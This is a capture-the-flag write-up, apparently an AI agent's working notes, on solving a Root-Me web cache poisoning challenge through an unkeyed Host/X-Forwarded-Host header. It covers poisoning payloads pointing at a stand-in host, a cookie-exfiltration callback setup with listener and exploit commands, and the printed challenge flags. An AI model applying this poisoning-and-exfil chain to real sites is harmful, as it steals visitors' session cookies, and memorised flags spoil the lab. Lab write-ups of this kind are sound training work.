# Web Cache Poisoning - Unkeyed HTTP Header — notes

Target (Public instance): https://instance-019fea4d-c372-72aa-ab50-7693c220dc5a.challenges.root-me.pro
Platform: Root-Me Pro | Category: Web | 250 pts | Flag format: RM{...}

## Recon

- Server: `Werkzeug/3.1.3 Python/3.11.14` (Flask) behind a cache.
- Cache exposes its own state: `x-cache: hit|miss`.
- Cache-Control per route:
  - `/` (no username): `public, max-age=86400`
  - `/?username=X`:     `public, max-age=30`
  - `/report`:          `public, max-age=86400`
  - 404 pages:          `public, max-age=86400`  <-- cached! useful as an oracle
  - `/static/js/*`:     `public, max-age=86400`, `application/javascript`, **no X-Content-Type-Options**
- Routes: `/` (username personalization), `/report` (POST `path=` → admin bot visits it).

## Injection point

`/?username=X` renders a results block containing an **absolute, protocol-relative** script src
built from the request Host:

```html
<script src="//instance-...challenges.root-me.pro/static/js/confettis_manager.js"></script>
```

The `username` value itself is HTML-escaped (`<` → `&lt;`), so no direct XSS there.
The host portion is **not** escaped into a usable breakout either — quotes become `&#34;`:

```
X-Forwarded-Host: x"></script><script>alert(1)</script>
→ src="//x&#34;&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;/static/js/..."
```

...but the host value CAN contain `/` and `?`, so the URL is fully steerable:

```
X-Forwarded-Host: evil.pauk/a?b=
→ src="//evil.pauk/a?b=/static/js/confettis_manager.js"
```

## Vulnerability confirmed

`X-Forwarded-Host` is **unkeyed** — it changes the response body but is not part of the cache key
(key = path + query only). Proof: sent one request with `X-Forwarded-Host: evil.pauk`, then sent
requests with *different* headers to the same URL and got `x-cache: hit` still serving
`//evil.pauk/...`. A clean request with no override also gets the poisoned copy.

Also reflected the same way (all equivalent, app trusts a chain of them):
`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=`.

So: one attacker request → every visitor of that URL (including the admin bot) loads attacker JS.

## Constraint hit: no reachable listener

Kali is behind VirtualBox NAT (`10.0.2.15`), no public IP, and the Root-Me WireGuard tunnel is
down (`sudo` needs a password in the agent shell, `/etc/wireguard` unreadable).
The reference writeup used **VPN mode** where the client gets a routable tunnel IP
(e.g. `10.250.0.10:40100`) that the challenge box can call back to.

## In-scope oracle (no third-party exfil host)

Instead of an external collector, point the poisoned script src back at the target itself on a
unique path. 404s are cached, so cache state becomes a read/write channel:

1. Poison `/?username=<rand>` with `X-Forwarded-Host: <target-host>/<beacon>?z=`
   → `src="//<target-host>/<beacon>?z=/static/js/confettis_manager.js"`
2. `POST /report` with `path=/?username=<rand>`
3. Request `/<beacon>?z=/static/js/confettis_manager.js` and read `x-cache`:
   - `hit`  → the bot rendered our poisoned page and fetched the URL → bot confirmed, full RCE-on-client path is live
   - `miss` → bot never rendered it

beacon=beacond27139bf, username=poison44caae

## Status / next step

Poisoning verified. Waiting on beacon oracle to confirm the bot.
To actually exfiltrate the admin cookie we need a callback host the box can reach →
switch the challenge to **VPN** mode and `sudo wg-quick up rootme`, then serve
`confettis_manager.js` from the tunnel IP.

## SOLVED

Got the WireGuard tunnel up (`sudo wg-quick up rootme`), which gave a routable callback IP
(`10.250.0.10:40100`) instead of the earlier in-scope-oracle workaround. Hosted the real
exfil payload there, poisoned via `Host` header (not `X-Forwarded-Host` — plain `Host` worked
directly), reported the poisoned URL, bot fetched it and leaked its `flag` cookie.

Instance: instance-019fea4d-c372-72aa-ab50-7693c220dc5a.challenges.root-me.pro

Flag: RM{375c79b6987947983427fe33703f4fad}

writeup.md updated to final solved state.

## Re-solve 2026-08-10 (instance 019fea4d-c372-72aa-ab50-7693c220dc5a)

Per-instance flag — the earlier RM{375c...} was dead. New flag:

    RM{7dd71a7a0b62263b31d0dc171fe048a6}

Cookie was `flag=RM{...}` and NOT HttpOnly — `document.cookie` was enough.

Two real bugs in the old attempt, both fixed:

1. Payload exfil URLs were RELATIVE (`new Image().src = "/x?..."`). A relative URL resolves
   against the DOCUMENT origin (the challenge app), not the script's origin — so every beacon
   went to the target instead of our listener. This is why earlier runs saw the bot fetch the
   JS but never saw an exfil. Now absolute: `http://172.29.7.32:8888/x?...` + sync XHR backup.
2. Targeted the PUBLIC HTTPS URL. An https page loading `//172.29.7.32:8888/...` is mixed
   active content → browser blocks it silently. Use the VPN endpoint (plain HTTP)
   `http://10.250.0.10:40100` instead.

VPN config was missing from /etc/wireguard — downloaded fresh from the challenge VPN tab.
Tunnel IP this session: 172.29.7.32.

Working command sequence:
    sudo wg-quick up rootme
    mkdir -p www/static/js && cp confettis_manager.js www/static/js/
    nohup python3 -m http.server 8888 --bind 172.29.7.32 --directory www > listener.log 2>&1 &
    ./exploit.py --target http://10.250.0.10:40100 --listener 172.29.7.32:8888
    grep -oE 'RM(%7B|\{)[^}%]*(%7D|\})' listener.log

Full callback log preserved in listener-solved.log.
